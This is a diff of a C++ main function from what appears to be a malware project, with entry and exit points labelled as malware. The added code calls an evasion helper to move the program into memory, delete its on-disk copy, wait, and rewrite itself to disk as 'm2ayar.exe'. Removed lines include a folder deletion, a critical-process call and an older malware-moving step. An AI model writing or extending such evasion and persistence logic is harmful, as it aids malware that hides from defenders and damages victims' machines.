@@ -12,28 +12,18 @@ DataTools	Disk;
 RuntimeTools	Runner;
 
 
-int main(int argc, char** argv){
-	cvinit(argc, argv);
+int main(MALWARE_ENTRY){
+	cvinit(MALWARE_INIT);
 
-	SetMalwareMode(OFF);
+	if(Evador.MoveIntoMemory())
+		printf("MIM Error\n");
 
-	Disk.FolderDelete("5ara");
+	Evador.SelfDestruct();
 
-	cvexit(0x00);
-	Runner.CriticalProcess();
+	Runner.Wait(10);
 
-	cout << Runner.Pwd() << std::endl;
+	if(Evador.MoveBackToDisk("m2ayar.exe"))
+		printf("MBTD Error\n");
 
-	Evador.MoveMalware("moved/asd.exe");
-
-
-	if (Disk.FileExists("getpid.cpp")){
-		printf ("getpid ayre exists\n");
-	}
-	if (Disk.FileExists("zabra")){
-		printf("zabra Exists\n");
-	}
-
-	Runner.Wait(1000);
-	cvexit(0x00);
+	cvexit(MALWARE_EXIT);
 }
